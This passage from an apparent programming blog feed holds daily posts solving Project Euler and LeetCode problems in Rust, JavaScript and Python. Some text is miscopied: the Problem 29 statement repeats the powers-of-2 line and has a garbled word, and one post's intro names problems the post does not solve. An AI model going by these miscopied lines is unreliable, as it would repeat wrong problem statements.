&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ok[tmp <span class="keyword">as</span> <span class="built_in">usize</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> product &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = product % <span class="number">10</span>;</span><br><span class="line">        product /= <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span> || ok[tmp <span class="keyword">as</span> <span class="built_in">usize</span>] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ok[tmp <span class="keyword">as</span> <span class="built_in">usize</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="135-Candy"><a href="#135-Candy" class="headerlink" title="135. Candy"></a>135. Candy</h3><p>There are <em>N</em> children standing in a line. Each child is assigned a rating value.</p><p>You are giving candies to these children subjected to the following requirements:</p><ul><li>Each child must have at least one candy.</li><li>Children with a higher rating get more candies than their neighbors.</li></ul><p>What is the minimum candies you must give?</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,0,2]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: You can allocate to the first, second and third child with 2, 1, 2 candies respectively.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,2]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: You can allocate to the first, second and third child with 1, 2, 1 candies respectively.</span><br><span class="line">             The third child gets 1 candy because it satisfies the above two conditions.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>If ultimate answer is arr[n], consider one position k, arr[k] can only be arr[k-1] + 1, 1, or arr[k+1] + 1, which means all we need is scanning ratings from left, and scanning ratings from right.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; ratings</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> candy = <span class="function"><span class="keyword">function</span>(<span class="params">ratings</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = ratings.length;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">let</span> right = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  left[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  right[n<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    left[i] = ratings[i] &gt; ratings[i<span class="number">-1</span>]? left[i<span class="number">-1</span>] + <span class="number">1</span>: <span class="number">1</span>;</span><br><span class="line">    right[n<span class="number">-1</span>-i] = ratings[n<span class="number">-1</span>-i] &gt; ratings[n-i]? right[n-i] + <span class="number">1</span>: <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    ans += <span class="built_in">Math</span>.max(left[i], right[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(candy([1,0,2]));</span></span><br><span class="line"><span class="comment">// console.log(candy([1,2,2]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-20 Daily Challenge</title>
      <link href="/2019-01-20-Daily-Challenge/"/>
      <url>/2019-01-20-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Digit fifth powers</em> in <em>Rust</em> and <em>Valid Square</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Coin-sums"><a href="#Coin-sums" class="headerlink" title="Coin sums"></a>Coin sums</h3><h3 id="Problem-31"><a href="#Problem-31" class="headerlink" title="Problem 31"></a>Problem 31</h3><p>In England the currency is made up of pound, £, and pence, p, and there are eight coins in general circulation:</p><blockquote><p>1p, 2p, 5p, 10p, 20p, 50p, £1 (100p) and £2 (200p).</p></blockquote><p>It is possible to make £2 in the following way:</p><blockquote><p>1×£1 + 1×50p + 2×20p + 1×5p + 1×2p + 3×1p</p></blockquote><p>How many different ways can £2 be made using any number of coins?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Use DP to solve it.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, solve(<span class="number">200</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">solve</span></span>(n: <span class="built_in">usize</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> arr: <span class="built_in">Vec</span>&lt;<span class="built_in">i32</span>&gt; = <span class="built_in">vec!</span>[<span class="number">0</span>; n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">let</span> coins: [<span class="built_in">usize</span>; <span class="number">8</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">200</span>];</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> coin <span class="keyword">in</span> coins.iter() &#123;</span><br><span class="line">        <span class="keyword">if</span> *coin &lt;= n &#123;</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> *coin..(n+<span class="number">1</span>) &#123;</span><br><span class="line">                arr[i] += arr[i - coin];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="168-Excel-Sheet-Column-Title"><a href="#168-Excel-Sheet-Column-Title" class="headerlink" title="168. Excel Sheet Column Title"></a>168. Excel Sheet Column Title</h3><p>Easy</p><p>Given a positive integer, return its corresponding column title as appear in an Excel sheet.</p><p>For example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt; A</span><br><span class="line">2 -&gt; B</span><br><span class="line">3 -&gt; C</span><br><span class="line">...</span><br><span class="line">26 -&gt; Z</span><br><span class="line">27 -&gt; AA</span><br><span class="line">28 -&gt; AB </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: &quot;A&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 28</span><br><span class="line">Output: &quot;AB&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 701</span><br><span class="line">Output: &quot;ZY&quot;</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> convertToTitle = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  n -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> base = <span class="number">26</span>;</span><br><span class="line">  <span class="keyword">let</span> len = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">while</span>(n &gt;= base)&#123;</span><br><span class="line">    n -= base;</span><br><span class="line">    len += <span class="number">1</span>;</span><br><span class="line">    base *= <span class="number">26</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(len)&#123;</span><br><span class="line">    ans += <span class="built_in">String</span>.fromCharCode(n%<span class="number">26</span>+<span class="number">65</span>);</span><br><span class="line">    len -= <span class="number">1</span>;</span><br><span class="line">    n = <span class="built_in">Math</span>.floor(n/<span class="number">26</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-19 Daily Challenge</title>
      <link href="/2019-01-19-Daily-Challenge/"/>
      <url>/2019-01-19-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Digit fifth powers</em> in <em>Rust</em> and <em>Valid Square</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Digit-fifth-powers"><a href="#Digit-fifth-powers" class="headerlink" title="Digit fifth powers"></a>Digit fifth powers</h3><h3 id="Problem-30"><a href="#Problem-30" class="headerlink" title="Problem 30"></a>Problem 30</h3><p>Surprisingly there are only three numbers that can be written as the sum of fourth powers of their digits:</p><p>$1634 = 1^4 + 6^4 + 3^4 + 4^4$<br>$8208 = 8^4 + 2^4 + 0^4 + 8^4$<br>$9474 = 9^4 + 4^4 + 7^4 + 4^4$</p><p>As $1 = 1^4$ is not a sum it is not included.</p><p>The sum of these numbers is 1634 + 8208 + 9474 = 19316.</p><p>Find the sum of all the numbers that can be written as the sum of fifth powers of their digits.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>All you need is a DFS.</p><p>Because $9^5&lt;10^5$,$7\times 9^5&lt;10^6$, so upper bound of DFS is 6.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">Vec</span>&lt;<span class="built_in">i32</span>&gt; = <span class="built_in">Vec</span>::new();</span><br><span class="line">    dfs(<span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;<span class="keyword">mut</span> ans);</span><br><span class="line">    ans.sort();</span><br><span class="line">    ans.dedup();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> &amp;ans &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, num);</span><br><span class="line">        ans_sum += num;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans_sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">dfs</span></span>(c: <span class="built_in">i32</span>, n: <span class="built_in">i32</span>, num: <span class="built_in">i32</span>, sum: <span class="built_in">i32</span>, ans: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;<span class="built_in">i32</span>&gt;)&#123;</span><br><span class="line">    <span class="keyword">if</span> sum == num &amp;&amp; sum &gt; <span class="number">1</span> &#123;</span><br><span class="line">        ans.push(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> c &gt; n &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0i32</span>..<span class="number">10i32</span> &#123;</span><br><span class="line">        dfs(c+<span class="number">1</span>, n, num*<span class="number">10</span> + i, sum + i.pow(n <span class="keyword">as</span> <span class="built_in">u32</span>), ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="593-Valid-Square"><a href="#593-Valid-Square" class="headerlink" title="593. Valid Square"></a>593. Valid Square</h3><p>Medium</p><p>Given the coordinates of four points in 2D space, return whether the four points could construct a square.</p><p>The coordinate (x,y) of a point is represented by an integer array with two integers.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: p1 = [0,0], p2 = [1,1], p3 = [1,0], p4 = [0,1]</span><br><span class="line">Output: True</span><br></pre></td></tr></table></figure><p>Note:</p><ol><li>All the input integers are in the range [-10000, 10000].</li><li>A valid square has four equal sides with positive length and four equal angles (90-degree angles).</li><li>Input points have no order.</li></ol><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Here&#39;s how I solve it:</p><ol><li>There is three line when you fixed one point, and pick up shorter two.</li><li>Check if these two line are of same length and don&#39;t equal zero.</li><li>Check if these two line are perpendicular.</li></ol><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; p1</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; p2</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; p3</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; p4</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> validSquare = <span class="function"><span class="keyword">function</span>(<span class="params">p1, p2, p3, p4</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dis = <span class="function">(<span class="params">p1, p2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.sqrt((p1[<span class="number">0</span>]-p2[<span class="number">0</span>])*(p1[<span class="number">0</span>]-p2[<span class="number">0</span>])+(p1[<span class="number">1</span>]-p2[<span class="number">1</span>])*(p1[<span class="number">1</span>]-p2[<span class="number">1</span>]));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> cmp = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a-b &gt;<span class="number">1e-6</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(cmp(dis(p1,p2), dis(p1,p3))) [p2, p4] = [p4, p2];</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(cmp(dis(p1,p3), dis(p1, p2))) [p3, p4] = [p4, p3];</span><br><span class="line">  <span class="keyword">return</span> !cmp(dis(p1,p2),dis(p1,p3)) &amp;&amp; !cmp(dis(p1,p3),dis(p1,p2)) &amp;&amp; cmp(dis(p1,p2),<span class="number">0</span>)&amp;&amp;</span><br><span class="line">         (<span class="built_in">Math</span>.abs(p1[<span class="number">0</span>]-p2[<span class="number">0</span>]) === <span class="built_in">Math</span>.abs(p3[<span class="number">0</span>]-p4[<span class="number">0</span>])) &amp;&amp;</span><br><span class="line">         (<span class="built_in">Math</span>.abs(p1[<span class="number">1</span>]-p2[<span class="number">1</span>]) === <span class="built_in">Math</span>.abs(p3[<span class="number">1</span>]-p4[<span class="number">1</span>])) &amp;&amp;</span><br><span class="line">         (<span class="built_in">Math</span>.abs(p1[<span class="number">0</span>]-p3[<span class="number">0</span>]) === <span class="built_in">Math</span>.abs(p2[<span class="number">0</span>]-p4[<span class="number">0</span>])) &amp;&amp;</span><br><span class="line">         (<span class="built_in">Math</span>.abs(p1[<span class="number">1</span>]-p3[<span class="number">1</span>]) === <span class="built_in">Math</span>.abs(p2[<span class="number">1</span>]-p4[<span class="number">1</span>])) &amp;&amp;</span><br><span class="line">         ((p1[<span class="number">0</span>]-p2[<span class="number">0</span>])*(p1[<span class="number">0</span>]-p3[<span class="number">0</span>])+(p1[<span class="number">1</span>]-p3[<span class="number">1</span>])*(p1[<span class="number">1</span>]-p2[<span class="number">1</span>]) === <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(validSquare(p1 = [0,0], p2 = [1,1], p3 = [1,0], p4 = [0,1]));</span></span><br><span class="line"><span class="comment">// console.log(validSquare([0,0], [5,0], [5,4], [0,4]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-18 Daily Challenge</title>
      <link href="/2019-01-18-Daily-Challenge/"/>
      <url>/2019-01-18-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Distinct powers</em> in <del><em>Oral Calculation</em></del><em>Rust</em> and <em>To Lower Case</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Distinct-powers"><a href="#Distinct-powers" class="headerlink" title="Distinct powers"></a>Distinct powers</h3><h3 id="Problem-29"><a href="#Problem-29" class="headerlink" title="Problem 29"></a>Problem 29</h3><p>Consider all integer combinations of $a^b$ for 2 ≤ <em>a</em> ≤ 5 and 2 ≤ <em>b</em> ≤ 5:</p><p>$$2^2=4,2^3=8,2^4=16,2^5=32$$</p><p>$$3^2=9,3^3=27,3^4=81,3^5=243$$</p><p>$$2^2=4,2^3=8,2^4=16,2^5=32$$</p><p>$$2^2=4,2^3=8,2^4=16,2^5=32$$</p><p>If they are then placed in ppowewernumerical order, with any repeats removed, we get the following sequence of 15 distinct terms:</p><p>4, 8, 9, 16, 25, 27, 32, 64, 81, 125, 243, 256, 625, 1024, 3125</p><p>How many distinct terms are in the sequence generated by $a^b$ for 2 ≤ <em>a</em> ≤ 100 and 2 ≤ <em>b</em> ≤ 100?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I&#39;ll do it with inclusion-exclusion principle.</p><p>Powers of two which under 101 are 4, 8, 16, 32, 64.</p><p>Powers of three which under 101 are 9, 27, 81.</p><p>Powers of four which under 101 are 16, 64.</p><p>Powers of five which under 101 is 25.</p><p>Powers of six which under 101 is 36.</p><p>Powers of seven which under 101 is 49.</p><p>Powers of eight which under 101 is 64.</p><p>Powers of nine which under 101 is 81.</p><p>Powers of ten  which under 101 is 100.</p><p>Answer is</p><p> $$|powers\ of\ 2|+|powers\ of\ 3|+...+|powers\ of\ 100|-$$</p><p>$$|powers\ of\ 2\ and\ 4|-..-|powers\ of\ 10\ and\ 100|+$$</p><p>$$|powers\ of\ 2,4,16|+|powers\ of\ 3,9,81|-|powers\ of\ 2,4,8,64|$$</p><p>And I come up with this draft on plane</p><img src="/2019-01-18-Daily-Challenge/1547745823917.png" title="wrong_thought"><p>And yes! Get the wrong answer XD</p><p>I check my thoughts and found I miss a lot of thing. So I decide to do it with brute force :p</p><p>Code to check my id:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = set()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">101</span>):</span><br><span class="line">    l = len(s)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">101</span>):</span><br><span class="line">        s.add(i**j)</span><br><span class="line">    print(i,len(s)-l)</span><br></pre></td></tr></table></figure><p>Result:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">2 99  </span><br><span class="line">3 99  </span><br><span class="line">4 50  </span><br><span class="line">5 99  </span><br><span class="line">6 99  </span><br><span class="line">7 99  </span><br><span class="line">8 50  </span><br><span class="line">9 50  </span><br><span class="line">10 99 </span><br><span class="line">11 99 </span><br><span class="line">12 99 </span><br><span class="line">13 99 </span><br><span class="line">14 99 </span><br><span class="line">15 99 </span><br><span class="line">16 41 </span><br><span class="line">17 99 </span><br><span class="line">18 99 </span><br><span class="line">19 99 </span><br><span class="line">20 99 </span><br><span class="line">21 99 </span><br><span class="line">22 99 </span><br><span class="line">23 99 </span><br><span class="line">24 99 </span><br><span class="line">25 50 </span><br><span class="line">26 99 </span><br><span class="line">27 50 </span><br><span class="line">28 99 </span><br><span class="line">29 99 </span><br><span class="line">30 99 </span><br><span class="line">31 99 </span><br><span class="line">32 51 </span><br><span class="line">33 99 </span><br><span class="line">34 99 </span><br><span class="line">35 99 </span><br><span class="line">36 50 </span><br><span class="line">37 99 </span><br><span class="line">38 99 </span><br><span class="line">39 99 </span><br><span class="line">40 99 </span><br><span class="line">41 99 </span><br><span class="line">42 99 </span><br><span class="line">43 99 </span><br><span class="line">44 99 </span><br><span class="line">45 99 </span><br><span class="line">46 99 </span><br><span class="line">47 99 </span><br><span class="line">48 99 </span><br><span class="line">49 50 </span><br><span class="line">50 99 </span><br><span class="line">51 99 </span><br><span class="line">52 99 </span><br><span class="line">53 99 </span><br><span class="line">54 99 </span><br><span class="line">55 99 </span><br><span class="line">56 99 </span><br><span class="line">57 99 </span><br><span class="line">58 99 </span><br><span class="line">59 99 </span><br><span class="line">60 99 </span><br><span class="line">61 99 </span><br><span class="line">62 99 